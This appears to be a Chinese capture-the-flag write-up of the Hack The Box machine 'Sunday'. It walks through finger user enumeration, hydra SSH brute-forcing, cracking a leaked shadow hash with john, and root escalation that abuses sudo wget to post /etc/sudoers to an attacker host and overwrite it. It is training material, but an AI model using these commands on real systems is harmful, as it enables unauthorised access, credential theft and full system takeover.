# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务发现
这个靶机非常的不稳定，先用```--open```参数看看有哪些端口打开
```
┌──(root💀kali)-[~/htb/Sunday]
└─# nmap -p- 10.10.10.76 --open
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-16 09:22 EST
Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 1.35% done; ETC: 09:32 (0:09:46 remaining)
Nmap scan report for 10.10.10.76
Host is up (0.30s latency).
Not shown: 44865 filtered ports, 20665 closed ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
22022/tcp open  unknown
47097/tcp open  unknown
58984/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 653.01 seconds



```

指定端口，获取服务详细信息看看
```
┌──(root💀kali)-[~/htb/Sunday]
└─# nmap -sV -sC 10.10.10.76 -A -O -p 79,111,22022,47097,58984
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-16 09:36 EST
Nmap scan report for 10.10.10.76
Host is up (0.30s latency).

PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
47097/tcp open  unknown
58984/tcp open  unknown
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
Network Distance: 21 hops
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

TRACEROUTE (using port 79/tcp)
HOP RTT        ADDRESS
1   306.96 ms  10.10.14.1
2   2362.53 ms 10.10.14.1
3   2362.68 ms 10.10.14.1
4   ... 10
11  3138.72 ms 10.10.14.1
12  2460.64 ms 10.10.14.1
13  ... 20
21  297.28 ms  10.10.10.76

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.18 seconds



```
## finger服务
79端口在[hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-finger)是这样介绍的
>Finger is a program you can use to find information about computer users. It usually lists the login name, the full name, and possibly other details about the user you are fingering. These details may include the office location and phone number (if known), login time, idle time, time mail was last read, and the user's plan and project files.

也就说这个服务可以回显一些靶机的用户信息，比如
```
┌──(root💀kali)-[~/htb/sunday]
└─# finger root@10.10.10.76                                                                                                                                                                                    1 ⨯
Login       Name               TTY         Idle    When    Where
root     Super-User            pts/3        <Apr 24, 2018> sunday 

```

但是如果探测一个不存在的用户，则啥都没有
```
┌──(root💀kali)-[~/htb/sunday]
└─# finger asdjkasjd@10.10.10.76
Login       Name               TTY         Idle    When    Where
asdjkasjd             ???

```

因此，利用这个功能，我们可以知道靶机上有哪些真实存在的用户。

使用[这个字典](https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt#L8)

以及msf里面的```scanner/finger/finger_users```模块，探测到以下用户信息
```
msf6 auxiliary(scanner/finger/finger_users) > run

[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: uucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nuucp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: listen
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: smmsp
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sammy
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sunny
[+] 10.10.10.76:79        - 10.10.10.76:79 Users found: adm, dladm, listen, lp, noaccess, nobody, nobody4, nuucp, sammy, smmsp, sunny, uucp
[*] 10.10.10.76:79        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

```sammy```和```sunny```看上去比较像可以用ssh登录的用户
测试一下
```
 finger sammy@10.10.10.76
Login       Name               TTY         Idle    When    Where
sammy    sammy                 console      <Jul 31, 2020>
                                                                                                                                                                                                                   
┌──(root💀kali)-[~/htb/sunday]
└─# finger sunny@10.10.10.76
Login       Name               TTY         Idle    When    Where
sunny    sunny                 pts/3        <Apr 24, 2018> 10.10.14.4   
```

保存到user.txt,使用hydra爆破ssh

```
┌──(root💀kali)-[~/htb/sunday]
└─# hydra -L /root/htb/sunday/user.txt -P  /usr/share/wordlists/rockyou.txt -I -f  -s 22022 10.10.10.76 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-16 10:59:18
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 4 login tries (l:2/p:2), ~1 try per task
[DATA] attacking ssh://10.10.10.76:22022/
[22022][ssh] host: 10.10.10.76   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-16 10:59:23

```


得到一个ssh用户凭证：```sunny : sunday```

# 初始shell

```
sunny@sunday:~/Documents$ find / -name user.txt
find: /export/home/sammy/.gnome2: Permission denied
find: /export/home/sammy/.gconf: Permission denied
/export/home/sammy/Desktop/user.txt

```
在sammy目录下，没有user.txt的使用权限，看来需要横向提权到sammy

在backup目录下找打shadow的备份文件
```
sunny@sunday:/backup$ ls
agent22.backup  shadow.backup
sunny@sunday:/backup$ cat shadow.backup 
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::

```

写两个文件，passwd和shadow
```
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/Sunday]
└─# cat passwd   
sammy:x:101:10:sammy:/export/home/sammy:/bin/bash
                                                                                                                                                                                                                                            
┌──(root💀kali)-[~/htb/Sunday]
└─# cat shadow   
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::

```

用unshadow命令把上面两个文件合并成一个john可以识别的哈希文件
```
┌──(root💀kali)-[~/htb/Sunday]
└─# unshadow passwd shadow >pass.hash   
```

爆破这个hash文件
```
┌──(root💀kali)-[~/htb/Sunday]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cooldude!        (sammy)
1g 0:00:01:11 DONE (2021-12-16 21:35) 0.01393g/s 2839p/s 2839c/s 2839C/s domonique1..chrystelle
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```


现在我们得到了sammy的ssh密码：```cooldude!```

# 提权

查看sammy的sudo特权
```
sunny@sunday:/home$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget

```

可以root身份使用wget，可以利用这个命令提权到root，步骤如下：

1. 在kali起一个监听，接收文件
>  nc -lnvp 80

2. 发送文件到kali
> sudo /usr/bin/wget --post-file=/etc/sudoers 10.10.14.6

3. 接收到文件sudoers
```
┌──(root💀kali)-[~/htb/Sunday]
└─# nc -lnvp 80                            
listening on [any] 80 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.76] 38814
POST / HTTP/1.0
User-Agent: Wget/1.10.2
Accept: */*
Host: 10.10.14.6
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 795

# sudoers file.
#
# This file MUST be edited with the 'visudo' command as root.
# Failure to use 'visudo' may result in syntax or file permission errors
# that prevent sudo from running.
#
# See the sudoers man page for the details on how to write a sudoers file.
#

# Host alias specification

# User alias specification

# Cmnd alias specification

# Defaults specification

# Runas alias specification

# User privilege specification
root    ALL=(ALL) ALL

# Uncomment to allow people in group wheel to run all commands
# %wheel        ALL=(ALL) ALL

# Same thing without a password
# %wheel        ALL=(ALL) NOPASSWD: ALL

# Samples
# %users  ALL=/sbin/mount /cdrom,/sbin/umount /cdrom
# %users  localhost=/sbin/shutdown -h now
sammy ALL=(root) NOPASSWD: /usr/bin/wget
sunny ALL=(root) NOPASSWD: /root/troll
```

4. 在本地把上面文件内容保存为sudoers，并且在最下方添加下面这行


> sammy  ALL=(root) NOPASSWD: /bin/bash


5. 在kali开启一个http服务
> python3 -m http.server

6. 靶机接收文件，并且覆盖到```/etc/sudoers```
sudo /usr/bin/wget http://10.10.14.6:8000/sudoers -O /etc/sudoers




```
sunny@sunday:/home$ sudo /usr/bin/wget http://10.10.14.6:8000/sudoers -O /etc/sudoers
--08:27:33--  http://10.10.14.6:8000/sudoers
           => `/etc/sudoers'
Connecting to 10.10.14.6:8000... 已连接。
已发出 HTTP 请求，正在等待回应... 200 OK
长度：850 [application/octet-stream]

100%[================================================================================================================================================================================================>] 850           --.--K/s             

08:27:34 (1.01 MB/s) - `/etc/sudoers' saved [850/850]

```

现在查看，我们有了bash特权

```
sunny@sunday:/home$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
    (root) NOPASSWD: /bin/bash

```

直接提权到root
```
sunny@sunday:/home$ sudo /bin/bash -p
root@sunday:/home# id
uid=0(root) gid=0(root) groups=0(root),1(other),2(bin),3(sys),4(adm),5(uucp),6(mail),7(tty),8(lp),9(nuucp),12(daemon)
root@sunday:/home# whoami
root

```

# 总结
切入点就是finger泄露的用户信息一步步渗透进系统，提权也很简单。但是这台靶机真是太不稳定了，体验好差，上论坛发现也是一堆人在吐槽。
枚举finger的时候可以不用msf，github上很多枚举脚本。